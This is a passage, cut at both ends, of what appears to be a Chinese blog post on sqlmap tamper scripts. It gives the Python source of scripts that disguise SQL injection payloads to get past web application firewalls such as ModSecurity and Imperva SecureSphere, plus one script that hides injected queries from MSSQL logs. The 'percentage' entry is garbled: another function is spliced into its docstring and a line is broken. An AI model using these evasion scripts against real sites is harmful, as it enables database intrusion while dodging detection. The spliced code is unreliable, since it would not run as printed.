re.finditer(r&quot;[A-Za-z_]+&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                retVal = retVal.replace(word, word.lower())</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>15.modsecurityversioned 在两个变量之间加上 &#x2F;<em>!30%</em>&#x2F;“ 类似于1 AND 2&gt;1– 转为 1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Embraces complete query with versioned comment</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass ModSecurity WAF/IDS</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 2&gt;1--&#x27;)</span><br><span class="line">    &#x27;1 /*!30874AND 2&gt;1*/--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        postfix = &#x27;&#x27;</span><br><span class="line">        for comment in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;):</span><br><span class="line">            if comment in payload:</span><br><span class="line">                postfix = payload[payload.find(comment):]</span><br><span class="line">                payload = payload[:payload.find(comment)]</span><br><span class="line">                break</span><br><span class="line">        if &#x27; &#x27; in payload:</span><br><span class="line">            retVal = &quot;%s /*!30%s%s*/%s&quot; % (payload[:payload.find(&#x27; &#x27;)], randomInt(3), payload[payload.find(&#x27; &#x27;) + 1:], postfix)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>16.modsecurityzeroversioned 在两个变量之间加上 &#x2F;<em>!00000 类似于1 AND 2&gt;1– 转为 1 &#x2F;</em>!00000AND 2&gt;1*&#x2F;–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Embraces complete query with zero-versioned comment</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass ModSecurity WAF/IDS</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 2&gt;1--&#x27;)</span><br><span class="line">    &#x27;1 /*!00000AND 2&gt;1*/--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        postfix = &#x27;&#x27;</span><br><span class="line">        for comment in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;):</span><br><span class="line">            if comment in payload:</span><br><span class="line">                postfix = payload[payload.find(comment):]</span><br><span class="line">                payload = payload[:payload.find(comment)]</span><br><span class="line">                break</span><br><span class="line">        if &#x27; &#x27; in payload:</span><br><span class="line">            retVal = &quot;%s /*!00000%s*/%s&quot; % (payload[:payload.find(&#x27; &#x27;)], payload[payload.find(&#x27; &#x27;) + 1:], postfix)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>17.multiplespaces 增加空格的个数。类似把一个空格使用4个空格(或者TAB)替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Adds multiple spaces around SQL keywords</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line"></span><br><span class="line">    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 UNION SELECT foobar&#x27;)</span><br><span class="line">    &#x27;1    UNION     SELECT   foobar&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        words = set()</span><br><span class="line"></span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, payload):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                words.add(word)</span><br><span class="line"></span><br><span class="line">        for word in words:</span><br><span class="line">            retVal = re.sub(&quot;(?&lt;=\W)%s(?=[^A-Za-z_(]|\Z)&quot; % word, &quot;%s%s%s&quot; % (&#x27; &#x27; * random.randrange(1, 4), word, &#x27; &#x27; * random.randrange(1, 4)), retVal)</span><br><span class="line">            retVal = re.sub(&quot;(?&lt;=\W)%s(?=[(])&quot; % word, &quot;%s%s&quot; % (&#x27; &#x27; * random.randrange(1, 4), word), retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>18.nonrecursivereplacement 主要是在(“UNION”, “SELECT”, “INSERT”, “UPDATE”, “FROM”, “WHERE”)中间继续填充一个关键词。<br> 把UNION SELECT转换为UNIOUNIONN SELESELECTCT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces predefined SQL keywords with representations</span><br><span class="line">    suitable for replacement (e.g. .replace(&quot;SELECT&quot;, &quot;&quot;)) filters</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak custom filters</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 UNION SELECT 2--&#x27;)</span><br><span class="line">    &#x27;1 UNIOUNIONN SELESELECTCT 2--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    keywords = (&quot;UNION&quot;, &quot;SELECT&quot;, &quot;INSERT&quot;, &quot;UPDATE&quot;, &quot;FROM&quot;, &quot;WHERE&quot;)</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    warnMsg = &quot;currently only couple of keywords are being processed %s. &quot; % str(keywords)</span><br><span class="line">    warnMsg += &quot;You can set it manually according to your needs&quot;</span><br><span class="line">    singleTimeWarnMessage(warnMsg)</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for keyword in keywords:</span><br><span class="line">            _ = random.randint(1, len(keyword) - 1)</span><br><span class="line">            retVal = re.sub(r&quot;(?i)\b%s\b&quot; % keyword, &quot;%s%s%s&quot; % (keyword[:_], keyword, keyword[_:]), retVal)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>19.overlongutf8 主要为使用%C0%AA替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Converts all characters in a given payload (not processing already</span><br><span class="line">    encoded)</span><br><span class="line"></span><br><span class="line">    Reference: https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM TABLE WHERE 2&gt;1&#x27;)</span><br><span class="line">    &#x27;SELECT FIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload: </span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += payload[i:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            else:</span><br><span class="line">                if payload[i] not in (string.ascii_letters + string.digits):</span><br><span class="line">                    retVal += &quot;%%C0%%%.2X&quot; % (0x8A | ord(payload[i]))</span><br><span class="line">                else:</span><br><span class="line">                    retVal += payload[i]</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>20.percentage  主要是使用%分割关键词类似于把SELECT 转换为%S%E%L%E%C%T</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Adds a percentage sign (&#x27;%&#x27;) infront of each character</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * ASP</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2000, 2005</span><br><span class="line">        * MySQL 5.1.56, 5.5.11</span><br><span class="line">        * PostgreSQL 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with random case value</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;INseRt&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                while True:</span><br><span class="line">                    _ = &quot;&quot;</span><br><span class="line"></span><br><span class="line">                    for i in xrange(len(word)):</span><br><span class="line">                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()</span><br><span class="line"></span><br><span class="line">                    if len(_) &gt; 1 and _ not in (_.lower(), _.upper()):</span><br><span class="line">                        break</span><br><span class="line"></span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line"></span><br><span class="line">    return retVal        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM TABLE&#x27;)</span><br><span class="line">    &#x27;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:</span><br><span class="line">                retVal += payload[i:i + 3]</span><br><span class="line">                i += 3</span><br><span class="line">            elif </span><br><span class="line">            payload[i] != &#x27; &#x27;:</span><br><span class="line">                retVal += &#x27;%%%s&#x27; % payload[i]</span><br><span class="line">                i += 1</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line">                i += 1</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>21.randomcase 随机转换大小写。类似于INSERT转换为INseRt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces each keyword character with random case value</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass very weak and bespoke web application firewalls</span><br><span class="line">          that has poorly written permissive regular expressions</span><br><span class="line">        * This tamper script should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;INseRt&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;[A-Za-z_]+&quot;, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                while True:</span><br><span class="line">                    _ = &quot;&quot;</span><br><span class="line"></span><br><span class="line">                    for i in xrange(len(word)):</span><br><span class="line">                        _ += word[i].upper() if randomRange(0, 1) else word[i].lower()</span><br><span class="line"></span><br><span class="line">                    if len(_) &gt; 1 and _ not in (_.lower(), _.upper()):</span><br><span class="line">                        break</span><br><span class="line"></span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>22.randomcomments 随机在关键词间插入&#x2F;<strong>&#x2F;.类似INSERT转换为I&#x2F;</strong>&#x2F;N&#x2F;**&#x2F;SERT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Add random comments to SQL keywords</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; import random</span><br><span class="line">    &gt;&gt;&gt; random.seed(0)</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span><br><span class="line">    &#x27;I/**/N/**/SERT&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        for match in re.finditer(r&quot;\b[A-Za-z_]+\b&quot;, payload):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            if len(word) &lt; 2:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">                _ = word[0]</span><br><span class="line"></span><br><span class="line">                for i in xrange(1, len(word) - 1):</span><br><span class="line">                    _ += &quot;%s%s&quot; % (&quot;/**/&quot; if randomRange(0, 1) else &quot;&quot;, word[i])</span><br><span class="line"></span><br><span class="line">                _ += word[-1]</span><br><span class="line"></span><br><span class="line">                if &quot;/**/&quot; not in _:</span><br><span class="line">                    index = randomRange(1, len(word) - 1)</span><br><span class="line">                    _ = word[:index] + &quot;/**/&quot; + word[index:]</span><br><span class="line"></span><br><span class="line">                retVal = retVal.replace(word, _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>23.securesphere 再末尾增加and ‘0having’&#x3D;’0having</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Appends special crafted string</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful for bypassing Imperva SecureSphere WAF</span><br><span class="line">        * Reference: http://seclists.org/fulldisclosure/2011/May/163</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 1=1&#x27;)</span><br><span class="line">    &quot;1 AND 1=1 and &#x27;0having&#x27;=&#x27;0having&#x27;&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return payload + &quot; and &#x27;0having&#x27;=&#x27;0having&#x27;&quot; if payload else payload</span><br></pre></td></tr></table></figure>

<p>24.sp_password 针对MSSQL的一种办法。在–后面增加sp_password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Appends &#x27;sp_password&#x27; to the end of the payload for automatic obfuscation from DBMS logs</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MSSQL</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure</span><br><span class="line">        * Reference: http://websec.ca/kb/sql_injection</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 9227=9227-- &#x27;)</span><br><span class="line">    &#x27;1 AND 9227=9227-- sp_password&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&#x27;#&#x27;, &quot;-- &quot;)) else &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>25.space2comment 使用&#x2F;**&#x2F;替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;/**/&quot;</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;/**/&quot;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>26.space2dash  使用–(rand)%0A替换掉空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with a dash comment (&#x27;--&#x27;) followed by</span><br><span class="line">    a random string and a new line (&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span 